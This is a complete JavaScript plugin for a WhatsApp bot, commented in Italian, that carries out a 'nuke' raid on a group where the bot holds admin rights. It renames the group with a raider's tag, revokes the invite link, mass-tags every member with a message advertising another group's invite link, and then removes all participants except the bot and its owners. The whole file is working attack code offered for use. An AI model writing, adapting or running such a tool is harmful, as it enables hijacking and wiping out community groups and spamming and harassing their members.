/*
  =============================================================
  PLUGIN: nuke10.js (Versione Link/ID - No Buttons)
  UTILIZZO: .nuke10 <link_gruppo o ID_gruppo>
  =============================================================
*/

const delay = time => new Promise(res => setTimeout(res, time));

let handler = async (m, { conn, args, usedPrefix, isOwner }) => {
    
    if (!isOwner) return; // Solo l'owner può eseguire

    let targetGroup = args[0];

    // 1. Controllo Input
    if (!targetGroup) {
        return m.reply(`Indica il link o l'ID del gruppo.\nEsempio: *${usedPrefix}nuke10 https://chat.whatsapp.com/xxxx*`);
    }

    // 2. Estrazione JID (ID Gruppo)
    let groupJid = '';
    if (targetGroup.includes('chat.whatsapp.com/')) {
        let code = targetGroup.split('chat.whatsapp.com/')[1].split(' ')[0];
        try {
            // Ottiene info dal link senza unirsi necessariamente
            let info = await conn.groupGetInviteInfo(code);
            groupJid = info.id;
        } catch (e) {
            return m.reply("❌ Link non valido o bot rimosso dal gruppo.");
        }
    } else if (targetGroup.includes('@g.us')) {
        groupJid = targetGroup;
    } else {
        return m.reply("❌ Formato non valido. Usa il link o l'ID (@g.us).");
    }

    // 3. Recupero Metadata e Controllo Admin
    let metadata;
    try {
        metadata = await conn.groupMetadata(groupJid);
    } catch (e) {
        return m.reply("❌ Il bot non è in quel gruppo o non può leggerne i dati.");
    }

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    const isBotAdmin = metadata.participants.find(p => p.id === botId)?.admin;

    if (!isBotAdmin) {
        return m.reply("❌ Il bot deve essere admin nel gruppo target per procedere.");
    }

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const participants = metadata.participants;

    // --- INIZIO PROCEDURA SACROON ---
    await m.reply(`☢️ *Attacco avviato su:* ${metadata.subject}`);

    // 🔹 CAMBIO NOME GRUPPO
    try {
        await conn.groupUpdateSubject(groupJid, `${metadata.subject} | 𝑺𝑽𝑻 𝑩𝒀  𝐒𝚫𝐂𝐑𝚯𝚯𝚴`);
    } catch (e) { console.error('Errore cambio nome:', e); }

    // 🔹 RESET LINK GRUPPO
    try {
        await conn.groupRevokeInvite(groupJid);
    } catch (e) { console.error('Errore reset link:', e); }

    // 🔹 MESSAGGI ORIGINALI + TAG TOTALE
    const allJids = participants.map(p => p.id);
    
    await conn.sendMessage(groupJid, {
        text: "𝐒𝚫𝐂𝐑𝚯𝚯𝚴 𝑹𝑬𝑮𝑵𝑨 𝑨𝑵𝑪𝑯𝑬 𝑺𝑼 𝑸𝑼𝑬𝑺𝑻𝑶 𝑮𝑹𝑼𝑷𝑷𝑶"
    });

    await conn.sendMessage(groupJid, {
        text: `𝑶𝑹𝑨 𝑬𝑵𝑻𝑹𝑨𝑻𝑬 𝑻𝑼𝑻𝑻𝑰 𝑸𝑼𝑰:\n\nhttps://chat.whatsapp.com/BjaVA7mrVhlKMczaJSPL5s?mode=gi_t`,
        mentions: allJids
    });

    await delay(1500); 

    // 🔹 HARD WIPE (RIMOZIONE MASSIVA)
    let usersToRemove = participants
        .map(p => p.id)
        .filter(jid => jid !== botId && !ownerJids.includes(jid));

    if (usersToRemove.length > 0) {
        try {
            await conn.groupParticipantsUpdate(groupJid, usersToRemove, 'remove');
            await m.reply(`✅ *Nuke eseguito.* ${usersToRemove.length} utenti rimossi.`);
        } catch (e) {
            await m.reply("❌ Errore durante la rimozione massiva.");
        }
    } else {
        await m.reply("⚠ Nessun utente da rimuovere.");
    }
};

handler.command = ['nuke10'];
handler.owner = true;

export default handler;
